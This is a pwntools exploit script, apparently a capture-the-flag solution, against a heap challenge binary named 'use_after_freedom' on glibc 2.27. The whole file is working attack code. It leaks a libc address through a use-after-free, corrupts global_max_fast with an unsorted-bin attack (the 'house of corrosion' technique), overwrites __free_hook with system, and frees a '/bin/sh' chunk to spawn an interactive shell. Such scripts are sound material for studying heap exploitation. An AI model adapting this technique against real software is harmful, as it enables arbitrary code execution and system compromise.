from pwn import *

r = process("./use_after_freedom", env={"LD_PRELOAD":"./libc-2.27.so"})
l = ELF("./libc-2.27.so", checksec=False)

def obtain(size, content):
    r.sendlineafter("> ", "1")
    r.sendlineafter("> ", str(size))
    r.sendafter("> ", content)

def lose(idx):
    r.sendlineafter("> ", "2")
    r.sendlineafter("> ", str(idx))

def change(idx, content):
    r.sendlineafter("> ", "3")
    r.sendlineafter("> ", str(idx))
    r.sendafter("> ", content)

def view(idx):
    r.sendlineafter("> ", "4")
    r.sendlineafter("> ", str(idx))

# setup
# the idea is house of corrosion, delta from first fastbin at main_arena+24 to __free_hook is 0x1c90 -> chunk_size = (0x1c90*2) + 0x20
obtain(0x3940, "A") # 0
obtain(0x20, "dummy") # 1

# leak libc
lose(0)
view(0)
l.address = u64(r.recvline(keepends=False).ljust(8, b'\0')) - 4111520
log.info("libc: " + hex(l.address))
global_max_fast = l.address + 0x3ed940

# unsorted attack
change(0, p64(0) + p64(global_max_fast - 0x10))
obtain(0x3940, "HACKERMANS") # 2

lose(2)
change(2, p64(l.symbols["system"]))
obtain(0x3940, "/bin/sh") # 3
lose(3)

r.interactive()
